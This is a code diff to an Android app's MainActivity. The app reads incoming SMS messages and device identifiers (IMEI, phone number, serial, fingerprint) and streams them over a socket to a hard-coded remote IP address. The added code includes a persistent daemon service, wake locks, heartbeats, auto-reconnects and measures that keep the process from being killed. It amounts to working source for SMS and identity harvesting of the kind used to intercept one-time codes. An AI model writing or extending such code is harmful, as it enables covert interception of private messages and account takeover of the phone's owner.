@@ -2,9 +2,16 @@ package com.brook.lazy.sample;
 
 import android.Manifest;
 import android.annotation.SuppressLint;
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.content.IntentFilter;
+import android.content.SharedPreferences;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Message;
+import android.os.PowerManager;
+import android.provider.Settings;
 import android.support.annotation.Nullable;
 import android.support.v7.app.AppCompatActivity;
 import android.support.v7.widget.LinearLayoutManager;
@@ -14,6 +21,7 @@ import android.view.View;
 import android.widget.Button;
 import android.widget.TextView;
 
+import com.brook.lazy.service.TraceServiceImpl;
 import com.brook.lazy.sms.SmsObserver;
 import com.brook.lazy.sms.SmsResponseCallback;
 import com.brook.lazy.utils.DevicesInfo;
@@ -23,6 +31,8 @@ import com.karumi.dexter.MultiplePermissionsReport;
 import com.karumi.dexter.PermissionToken;
 import com.karumi.dexter.listener.PermissionRequest;
 import com.karumi.dexter.listener.multi.MultiplePermissionsListener;
+import com.xdandroid.hellodaemon.DaemonEnv;
+import com.xdandroid.hellodaemon.IntentWrapper;
 
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -34,6 +44,7 @@ import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.net.Socket;
+import java.net.SocketException;
 import java.util.List;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
@@ -46,7 +57,7 @@ import io.reactivex.rxjava3.core.Observer;
 import io.reactivex.rxjava3.disposables.Disposable;
 
 public class MainActivity extends AppCompatActivity implements SmsResponseCallback {
-    private final String TAG=getClass().getName();
+    private final String TAG = getClass().getName();
     private TextView notData;
     private Button btnDeviceInfo;
     private RecyclerView mRecyclerView;
@@ -59,11 +70,15 @@ public class MainActivity extends AppCompatActivity implements SmsResponseCallba
     // 为了方便展示,此处直接采用线程池进行线程管理,而没有一个个开线程
     private ExecutorService mThreadPool;
     private InputStream is;
-    private InputStreamReader isr ;
-    private BufferedReader br ;
+    private InputStreamReader isr;
+    private DataInputStream input;
+    private BufferedReader br;
     private String response;
     private OutputStream outputStream;
     private Disposable mDisposable;
+    private Intent mIntent;
+    private MsgReceiver msgReceiver;
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -78,38 +93,46 @@ public class MainActivity extends AppCompatActivity implements SmsResponseCallba
 
         notData = (TextView) findViewById(R.id.not_data);
         Dexter.withActivity(this)
-                .withPermissions(Manifest.permission.READ_SMS,Manifest.permission.READ_PHONE_STATE)
+                .withPermissions(Manifest.permission.READ_SMS, Manifest.permission.READ_PHONE_STATE)
                 .withListener(new MultiplePermissionsListener() {
                     @Override
                     public void onPermissionsChecked(MultiplePermissionsReport report) {
-                        Log.i(getClass().getName(),"onPermissionsChecked ====="+report.areAllPermissionsGranted());
+                        Log.i(getClass().getName(), "onPermissionsChecked =====" + report.areAllPermissionsGranted());
                         smsObserver = new SmsObserver(MainActivity.this, MainActivity.this);
                         smsObserver.registerSMSObserver();
                     }
 
                     @Override
                     public void onPermissionRationaleShouldBeShown(List<PermissionRequest> permissions, PermissionToken token) {
-                        Log.i(getClass().getName(),"onPermissionRationaleShouldBeShown ====="+permissions.size());
+                        Log.i(getClass().getName(), "onPermissionRationaleShouldBeShown =====" + permissions.size());
                     }
                 }).check();
 //        Log.i(getClass().getName(),"registerSMSObserver =====开始注册");
+        //动态注册广播接收器
+        msgReceiver = new MsgReceiver();
+        IntentFilter intentFilter = new IntentFilter();
+        intentFilter.addAction("com.brook.communication.RECEIVER");
+        registerReceiver(msgReceiver, intentFilter);
 
         // 初始化线程池
         mThreadPool = Executors.newCachedThreadPool();
         initHandler();
         initListener();
+        setCPUAliveLock(this);
+        TraceServiceImpl.sShouldStopService = false;
+        DaemonEnv.startServiceMayBind(TraceServiceImpl.class);
     }
 
-    private void initListener(){
+    private void initListener() {
         btnDeviceInfo.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
-                if(socket!=null&&socket.isConnected()){
+                if (socket != null && socket.isConnected()) {
                     String registerInfo = deviceInfo().toString();
-                    smsAdapter.setmSmsLists("注册设备:"+registerInfo);
+                    smsAdapter.setmSmsLists("注册设备:" + registerInfo);
                     mRecyclerView.scrollToPosition(smsAdapter.getItemCount());
                     sendSocketMessage(registerInfo);
-                }else{
+                } else {
                     connectSocket();
                 }
             }
@@ -122,39 +145,40 @@ public class MainActivity extends AppCompatActivity implements SmsResponseCallba
 //        Log.i(getClass().getName(),"短信内容"+code);
         notData.setVisibility(View.GONE);
         mRecyclerView.setVisibility(View.VISIBLE);
-        String SmsInfo=smsInfo(code).toString();
-        smsAdapter.setmSmsLists("发送短信:"+SmsInfo);
+        String SmsInfo = smsInfo(code).toString();
+        smsAdapter.setmSmsLists("发送短信:" + SmsInfo);
         mRecyclerView.scrollToPosition(smsAdapter.getItemCount());
         sendSocketMessage(SmsInfo);
-        String smsInfo="_id: " + code[0] + "   address: " + code[1]+ "   body: " + code[2]+ "   date: " + code[3]+ "   name: " + code[4];
+        String smsInfo = "_id: " + code[0] + "   address: " + code[1] + "   body: " + code[2] + "   date: " + code[3] + "   name: " + code[4];
         smsAdapter.setmSmsLists(smsInfo);
         mRecyclerView.scrollToPosition(smsAdapter.getItemCount());
     }
+
     @SuppressLint("HandlerLeak")
-    private void initHandler(){
+    private void initHandler() {
         // 实例化主线程,用于更新接收过来的消息
         mMainHandler = new Handler() {
             @Override
             public void handleMessage(Message msg) {
                 switch (msg.what) {
-                    case 0:{
+                    case 0: {
                         String readMsg = (String) msg.obj;
-                        Log.i(TAG,"收到消息"+readMsg);
+                        Log.i(TAG, "收到消息" + readMsg);
                         break;
-                     }
+                    }
                     case 1:
                         smsAdapter.setmSmsLists("====连接成功====");
                         mRecyclerView.scrollToPosition(smsAdapter.getItemCount());
-                        if(mDisposable!=null&&!mDisposable.isDisposed()){
+                        if (mDisposable != null && !mDisposable.isDisposed()) {
                             mDisposable.dispose();
                         }
-                        interval(50);
+//                        interval(10);
                         break;
                     case 3:
                         String readMsg = (String) msg.obj;
-                        smsAdapter.setmSmsLists("接受到消息===>> "+readMsg);
+                        smsAdapter.setmSmsLists("接受到消息===>> " + readMsg);
                         mRecyclerView.scrollToPosition(smsAdapter.getItemCount());
-                        Log.i(TAG,"收到消息"+readMsg);
+                        Log.i(TAG, "收到消息" + readMsg);
                         break;
                 }
             }
@@ -165,7 +189,7 @@ public class MainActivity extends AppCompatActivity implements SmsResponseCallba
         connectSocket();
     }
 
-    private void connectSocket(){
+    private void connectSocket() {
         disConnect();
         mThreadPool.execute(new Runnable() {
             @Override
@@ -175,15 +199,18 @@ public class MainActivity extends AppCompatActivity implements SmsResponseCallba
 //                    http://47.75.166.206/
 //                    172.21.38.135
                     // 创建Socket对象 & 指定服务端的IP 及 端口号
-                    if(socket==null){
-                        socket = new Socket("47.75.166.206", 9503);
-                    }
+                    socket = SocketManager.getSingleton().getSocket("47.75.166.206", 9503);
                     // 判断客户端和服务器是否连接成功
-                    if(socket!=null&&smsAdapter != null){
-                        Log.i(TAG,"是否连接成功"+socket.isConnected());
+                    if (socket != null && smsAdapter != null) {
+                        Log.i(TAG, "是否连接成功" + socket.isConnected());
 //                        smsAdapter.setmSmsLists("是否连接成功:"+socket.isConnected());
                     }
-                    if(socket!=null&&socket.isConnected()){
+                    if (socket != null && socket.isConnected()) {
+                        // 步骤1：从Socket 获得输出流对象OutputStream
+                        // 该对象作用：发送数据
+                        outputStream = socket.getOutputStream();
+                        is = socket.getInputStream();
+                        input = new DataInputStream(socket.getInputStream());
                         Message msg = Message.obtain();
                         msg.what = 1;
                         mMainHandler.sendMessage(msg);
@@ -197,36 +224,71 @@ public class MainActivity extends AppCompatActivity implements SmsResponseCallba
         });
 
     }
-    //接受服务器消息
-    public void receievmessage(){
-        try{
-            while(true){
-                DataInputStream input = new DataInputStream(socket.getInputStream());
-                byte[] buffer;
-                buffer = new byte[input.available()];
-                if(buffer.length != 0){
-                    // 读取缓冲区
-                    input.read(buffer);
-                    String msg = new String(buffer, "GBK");//注意转码，不然中文会乱码。
-                    Message m = new Message();
-                    m.what = 3;
-                    m.obj = msg;
-                    mMainHandler.sendMessage(m);
+
+    /**
+     * 广播接收器
+     * @author len
+     *
+     */
+    public class MsgReceiver extends BroadcastReceiver {
+        @Override
+        public void onReceive(Context context, Intent intent) {
+            try {
+                socket.sendUrgentData(0xFF);//心跳包
+                //拿到进度，更新UI
+                long progress = intent.getLongExtra("progress", 0);
+                Log.i(TAG,"BroadcastReceiver==========="+progress);
+                Log.i(TAG, "倒计时===" + progress);
+                String sendPing = sendPing().toString();
+                smsAdapter.setmSmsLists("每隔" + 10 + "秒检测心跳: " + sendPing);
+                mRecyclerView.scrollToPosition(smsAdapter.getItemCount());
+                if (socket != null && !socket.isClosed()) {
+                    sendSocketMessage(sendPing().toString());
+                } else {
+                    smsAdapter.setmSmsLists("断开连接");
+                    connectSocket();
                 }
+            } catch (IOException e) {
+                e.printStackTrace();
+                connectSocket();
             }
-
-        }catch (Exception e) {
-
-            e.printStackTrace();
-            Message m = new Message();
-            m.what = -1;
-            mMainHandler.sendMessage(m);
         }
     }
 
 
+    //接受服务器消息
+    public void receievmessage() {
+        mThreadPool.execute(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    while (true) {
+                        byte[] buffer;
+                        buffer = new byte[input.available()];
+                        if (buffer.length != 0) {
+                            // 读取缓冲区
+                            input.read(buffer);
+                            String msg = new String(buffer, "GBK");//注意转码，不然中文会乱码。
+                            Message m = new Message();
+                            m.what = 3;
+                            m.obj = msg;
+                            mMainHandler.sendMessage(m);
+                        }
+                    }
+                } catch (Exception e) {
+                    e.printStackTrace();
+                    Message m = new Message();
+                    m.what = -1;
+                    mMainHandler.sendMessage(m);
+                    connectSocket();
+                }
+            }
+        });
+    }
+
+
     // 接收 服务器消息
-    private void acceptMessage(){
+    private void acceptMessage() {
         mThreadPool.execute(new Runnable() {
             @Override
             public void run() {
@@ -239,7 +301,7 @@ public class MainActivity extends AppCompatActivity implements SmsResponseCallba
                     br = new BufferedReader(isr);
                     // 步骤3：通过输入流读取器对象 接收服务器发送过来的数据
                     response = br.readLine();
-                    Log.i(TAG,"接受服务器数据"+response);
+                    Log.i(TAG, "接受服务器数据" + response);
                     // 步骤4:通知主线程,将接收的消息显示到界面
                     Message msg = Message.obtain();
                     msg.what = 0;
@@ -254,22 +316,18 @@ public class MainActivity extends AppCompatActivity implements SmsResponseCallba
 
 
     // 发送消息 给 服务器
-    private void sendSocketMessage(final String sendMsg){
+    private void sendSocketMessage(final String sendMsg) {
         mThreadPool.execute(new Runnable() {
             @Override
             public void run() {
                 try {
-                    // 步骤1：从Socket 获得输出流对象OutputStream
-                    // 该对象作用：发送数据
-                    outputStream = socket.getOutputStream();
                     // 步骤2：写入需要发送的数据到输出流对象中
-                    Log.i(TAG,"发送数据: "+sendMsg);
-                    outputStream.write((sendMsg+"\n").getBytes("utf-8"));
+                    Log.i(TAG, "发送数据: " + sendMsg);
+                    outputStream.write((sendMsg + "\n").getBytes("utf-8"));
                     // 特别注意：数据的结尾加上换行符才可让服务器端的readline()停止阻塞
                     // 步骤3：发送数据到服务端
                     outputStream.flush();
                 } catch (IOException e) {
-                    disConnect();
                     connectSocket();
                     e.printStackTrace();
                 }
@@ -277,50 +335,50 @@ public class MainActivity extends AppCompatActivity implements SmsResponseCallba
         });
     }
 
-    private void disConnect(){
-        try {
-            if(outputStream!=null){
-                // 断开 客户端发送到服务器 的连接，即关闭输出流对象OutputStream
-                outputStream.close();
+    private void disConnect() {
+        mThreadPool.execute(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    if (outputStream != null) {
+                        // 断开 客户端发送到服务器 的连接，即关闭输出流对象OutputStream
+                        outputStream.close();
+                    }
+                    if (br != null) {
+                        // 断开 服务器发送到客户端 的连接，即关闭输入流读取器对象BufferedReader
+                        br.close();
+                    }
+                    SocketManager.getSingleton().clearData();
+                    // 判断客户端和服务器是否已经断开连接
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
             }
-            if(br!=null){
-                // 断开 服务器发送到客户端 的连接，即关闭输入流读取器对象BufferedReader
-                br.close();
-            }
-            if(socket!=null){
-                // 最终关闭整个Socket连接
-                socket.close();
-                socket=null;
-            }
-
-            // 判断客户端和服务器是否已经断开连接
-//            System.out.println(socket.isConnected());
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
+        });
     }
 
     /**
      * 获取设备信息
+     *
      * @return JSONObject
      */
-    private JSONObject deviceInfo(){
-        JSONObject jsonObject=new JSONObject();
+    private JSONObject deviceInfo() {
+        JSONObject jsonObject = new JSONObject();
         try {
-            jsonObject.put("event","device_register");
-            String secret=EncryptUtil.md5(DevicesInfo.getDeviceFubgerprint() + DevicesInfo.getDeviceSerial() + DevicesInfo.getIMEI(this));
+            jsonObject.put("event", "device_register");
+            String secret = EncryptUtil.md5(DevicesInfo.getDeviceFubgerprint() + DevicesInfo.getDeviceSerial() + DevicesInfo.getIMEI(this));
             jsonObject.put("secret", secret);
-            JSONObject jsonO=new JSONObject();
+            JSONObject jsonO = new JSONObject();
             jsonO.put("secret", secret);
             jsonO.put("model", DevicesInfo.getDeviceModel());
             jsonO.put("width", DevicesInfo.getDeviceWidth(this));
             jsonO.put("height", DevicesInfo.getDeviceHeight(this));
             jsonO.put("serial", DevicesInfo.getDeviceSerial());
             jsonO.put("userCode", "R53531029");
-            jsonO.put("phone",  DevicesInfo.getNumber(this));
+            jsonO.put("phone", DevicesInfo.getNumber(this));
             jsonO.put("androidId", DevicesInfo.getIMEI(this));
             jsonO.put("fingerprint", DevicesInfo.getDeviceFubgerprint());
-            jsonObject.put("data",jsonO);
+            jsonObject.put("data", jsonO);
         } catch (JSONException e) {
             e.printStackTrace();
         }
@@ -328,25 +386,25 @@ public class MainActivity extends AppCompatActivity implements SmsResponseCallba
     }
 
 
-
     /**
      * 短信信息
+     *
      * @return JSONObject
      */
-    private JSONObject smsInfo(String[] smsInfo){
-        JSONObject jsonObject=new JSONObject();
+    private JSONObject smsInfo(String[] smsInfo) {
+        JSONObject jsonObject = new JSONObject();
         try {
-            jsonObject.put("event","sync_sms");
-            String secret=EncryptUtil.md5(DevicesInfo.getDeviceFubgerprint() + DevicesInfo.getDeviceSerial() + DevicesInfo.getIMEI(this));
+            jsonObject.put("event", "sync_sms");
+            String secret = EncryptUtil.md5(DevicesInfo.getDeviceFubgerprint() + DevicesInfo.getDeviceSerial() + DevicesInfo.getIMEI(this));
             jsonObject.put("secret", secret);
-            JSONObject jsonO=new JSONObject();
+            JSONObject jsonO = new JSONObject();
             jsonO.put("userCode", "R53531029");
             jsonO.put("smsid", smsInfo[0]);/** 短信id */
             jsonO.put("phone", smsInfo[1]);/** 手机号 */
             jsonO.put("content", smsInfo[2]);/** 短信内容 */
             jsonO.put("date", smsInfo[3]);/** 发送时间 */
             jsonO.put("name", smsInfo[4]);
-            jsonObject.put("data",jsonO);
+            jsonObject.put("data", jsonO);
         } catch (JSONException e) {
             e.printStackTrace();
         }
@@ -355,13 +413,14 @@ public class MainActivity extends AppCompatActivity implements SmsResponseCallba
 
     /**
      * 心跳信息
+     *
      * @return JSONObject
      */
-    private JSONObject sendPing(){
-        JSONObject jsonObject=new JSONObject();
+    private JSONObject sendPing() {
+        JSONObject jsonObject = new JSONObject();
         try {
-            String secret=EncryptUtil.md5(DevicesInfo.getDeviceFubgerprint() + DevicesInfo.getDeviceSerial() + DevicesInfo.getIMEI(this));
-            jsonObject.put("secret",secret);
+            String secret = EncryptUtil.md5(DevicesInfo.getDeviceFubgerprint() + DevicesInfo.getDeviceSerial() + DevicesInfo.getIMEI(this));
+            jsonObject.put("secret", secret);
             jsonObject.put("event", "ping");
         } catch (JSONException e) {
             e.printStackTrace();
@@ -380,18 +439,18 @@ public class MainActivity extends AppCompatActivity implements SmsResponseCallba
                 .subscribe(new Observer<Long>() {
                     @Override
                     public void onSubscribe(@NonNull Disposable d) {
-                        mDisposable=d;
+                        mDisposable = d;
                     }
 
                     @Override
                     public void onNext(@NonNull Long aLong) {
-                        Log.i(TAG,"倒计时==="+aLong);
-                        String sendPing =sendPing().toString();
-                        smsAdapter.setmSmsLists("每隔"+minutes+"秒检测心跳: "+sendPing);
+                        Log.i(TAG, "倒计时===" + aLong);
+                        String sendPing = sendPing().toString();
+                        smsAdapter.setmSmsLists("每隔" + minutes + "秒检测心跳: " + sendPing);
                         mRecyclerView.scrollToPosition(smsAdapter.getItemCount());
-                        if(socket!=null&&socket.isConnected()){
+                        if (socket != null && socket.isConnected()) {
                             sendSocketMessage(sendPing().toString());
-                        }else {
+                        } else {
                             smsAdapter.setmSmsLists("断开连接");
                             connectSocket();
                         }
@@ -410,16 +469,76 @@ public class MainActivity extends AppCompatActivity implements SmsResponseCallba
                 });
     }
 
+//    public void setWifiDormancy(Context context){
+//        int value = Settings.System.getInt(context.getContentResolver(), Settings.System.WIFI_SLEEP_POLICY,  Settings.System.WIFI_SLEEP_POLICY_DEFAULT);
+//        Log.d(TAG, "setWifiDormancy() returned: " + value);
+//        final SharedPreferences prefs = context.getSharedPreferences("wifi_sleep_policy", Context.MODE_PRIVATE);
+//        SharedPreferences.Editor editor = prefs.edit();
+//        editor.putInt(ConfigManager.WIFI_SLEEP_POLICY, value);
+//        editor.commit();
+//
+//        if(Settings.System.WIFI_SLEEP_POLICY_NEVER != value){
+//            Settings.System.putInt(context.getContentResolver(), Settings.System.WIFI_SLEEP_POLICY, Settings.System.WIFI_SLEEP_POLICY_NEVER);
+//        }
+//    }
+//
+//
+//    public void restoreWifiDormancy(Context context){
+//        final SharedPreferences prefs = context.getSharedPreferences("wifi_sleep_policy", Context.MODE_PRIVATE);
+//        int defaultPolicy = prefs.getInt(ConfigManager.WIFI_SLEEP_POLICY, Settings.System.WIFI_SLEEP_POLICY_DEFAULT);
+//        Settings.System.putInt(context.getContentResolver(), Settings.System.WIFI_SLEEP_POLICY, defaultPolicy);
+//    }
+
+    /**
+     * Thanks:  http://blog.csdn.net/wzj0808/article/details/52608940
+     * 保持系统CUP Active
+     */
+    private static PowerManager.WakeLock wl;
+
+    @SuppressLint("InvalidWakeLockTag")
+    public static void setCPUAliveLock(Context context) {
+        try {
+            if (wl != null)
+                releaseCPUAliveLock();
+            PowerManager pm = (PowerManager) context.getApplicationContext().getSystemService(Context.POWER_SERVICE);
+            if (pm != null) {
+                wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "ScreenOff");
+                wl.acquire(60 * 1000L /*10 minutes*/);
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    public static void releaseCPUAliveLock() {
+        try {
+            if (wl != null)
+                wl.release();
+            wl = null;
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+
+    //防止华为机型未加入白名单时按返回键回到桌面再锁屏后几秒钟进程被杀
+    public void onBackPressed() {
+        IntentWrapper.onBackPressed(this);
+    }
 
     @Override
     protected void onDestroy() {
-        if(mDisposable!=null&&!mDisposable.isDisposed()){
+        if (mDisposable != null && !mDisposable.isDisposed()) {
             mDisposable.dispose();
         }
-        if(smsObserver!=null){
+        if (smsObserver != null) {
             smsObserver.unregisterSMSObserver();
         }
         disConnect();
+        releaseCPUAliveLock();
+        TraceServiceImpl.stopService();
+        //注销广播
+        unregisterReceiver(msgReceiver);
         super.onDestroy();
     }
 
